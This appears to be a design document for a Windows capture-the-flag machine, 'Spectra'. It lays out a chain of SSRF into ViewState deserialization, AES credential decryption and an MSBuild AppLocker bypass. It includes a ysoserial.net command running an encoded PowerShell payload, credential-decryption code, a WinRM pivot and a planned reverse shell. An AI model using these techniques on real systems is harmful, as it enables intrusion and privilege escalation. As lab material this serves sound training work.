# CTF Machine: Spectra

## Overview

**Name:** Spectra
**Difficulty:** Hard
**OS:** Windows Server 2022
**Domain:** `spectra.ms`
**Theme:** Defense contractor signal intelligence platform — SSRF chained with ViewState deserialization, AES-encrypted credential recovery, and AppLocker bypass via MSBuild LOLBin

**Story:** Spectra Dynamics is a defense contractor running a SIGINT analysis portal (.NET WebForms on IIS), a Flask data relay API, and an internal Go config service. The config service's `/diagnostics` endpoint leaks machineKey values and AES encryption keys. Credentials in the MSSQL database are AES-encrypted with a static key. AppLocker is enforced but a scheduled task runs MSBuild against a writable `.proj` file as SYSTEM.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Web (80) | IIS — Corporate landing page (employee names) |
| Web (443) | IIS — SIGINT Analysis Portal (.NET WebForms, ViewState) |
| API (8443) | Flask — Data Relay API with Swagger docs |
| Internal (9090) | Go — Config service (localhost only) |
| Database | MSSQL (`SpectraDB`) — localhost only |
| Open Ports | 80, 443, 8443, 5985 (WinRM), 3389 (RDP — smart card only) |
| App runs as | `svc_sigint` (IIS AppPool) |

---

## Attack Chain

### 1 → SSRF + ViewState Deserialization — Anonymous → svc_sigint

Flask API at `POST /api/v1/reports/fetch` accepts a URL parameter — SSRF confirmed. Enumerate internal services via SSRF → discover `localhost:9090`. The `/diagnostics` endpoint leaks machineKey (validation + decryption keys), DB credentials, and an AES-256-CBC encryption key.

Use leaked machineKey to forge malicious ViewState with ysoserial.net → deserialization RCE on the SIGINT Portal (port 443).

**Exploitation:**
```powershell
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile \
  -c "powershell -e <BASE64>" \
  --validationalg="SHA1" --validationkey="<leaked>" \
  --decryptionalg="AES" --decryptionkey="<leaked>" \
  --path="/login.aspx" --apppath="/" --islegacy
```

🚩 **user.txt** → `C:\Users\svc_sigint\Desktop\user.txt`

---

### 2 → AES-Encrypted Database Credentials — svc_sigint → a.morgan

Query MSSQL `encrypted_credentials` table. Decrypt `a.morgan`'s password using the AES key leaked via SSRF in Phase 1.

**Exploitation:**
```powershell
$key = [Convert]::FromBase64String("<key_from_diagnostics>")
$encrypted = [Convert]::FromBase64String("<a.morgan_blob>")
$iv = $encrypted[0..15]; $ct = $encrypted[16..($encrypted.Length-1)]
$aes = [Security.Cryptography.Aes]::Create(); $aes.Key=$key; $aes.IV=$iv; $aes.Mode="CBC"
[Text.Encoding]::UTF8.GetString($aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length))
```

Pivot: `evil-winrm -i spectra.ms -u a.morgan -p 'Pr0t0c0l_7hund3r!'`

---

### 3 → AppLocker Bypass via MSBuild — a.morgan → SYSTEM

AppLocker blocks exe/script execution from user-writable paths. A scheduled task `\SpectraDynamics\SignalAnalysis` runs MSBuild.exe (in `C:\Windows\`) against `signal_processing.proj` every 5 minutes as SYSTEM. The `C:\SpectraDynamics\Analysis\` directory is writable by Signal Analysts group (which includes `a.morgan`).

**Exploitation:**
Replace `signal_processing.proj` with malicious MSBuild inline task containing C# reverse shell code. Wait for scheduled task execution.

🚩 **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

---

## Rabbit Holes

### Rabbit Hole 1: RDP Smart Card
**What the solver finds:** RDP on 3389 is open.
**Why it looks promising:** RDP with valid credentials.
**Why it's a dead end:** NLA requires smart card authentication; no certs on the box.

### Rabbit Hole 2: r.kim Encrypted Credentials
**What the solver finds:** Second encrypted credential in the database.
**Why it looks promising:** Same AES key decrypts it.
**Why it's a dead end:** `r.kim` has no WinRM access and is in Users group only — no privesc path.

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | `C:\Users\svc_sigint\Desktop\user.txt` | svc_sigint |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` | Administrator / SYSTEM |

---

## Full Chain Diagram

```
Anonymous
    │  Flask API SSRF → internal config service (localhost:9090)
    │  /diagnostics → machineKey + AES key + DB creds
    │  ysoserial.net ViewState deserialization RCE
    ▼
svc_sigint  →  user.txt
    │  MSSQL → encrypted_credentials table
    │  AES decrypt a.morgan password
    │  evil-winrm as a.morgan
    ▼
a.morgan
    │  AppLocker enforced — MSBuild LOLBin bypass
    │  Writable signal_processing.proj + scheduled task (SYSTEM)
    │  MSBuild inline C# task → reverse shell
    ▼
SYSTEM  →  root.txt
```
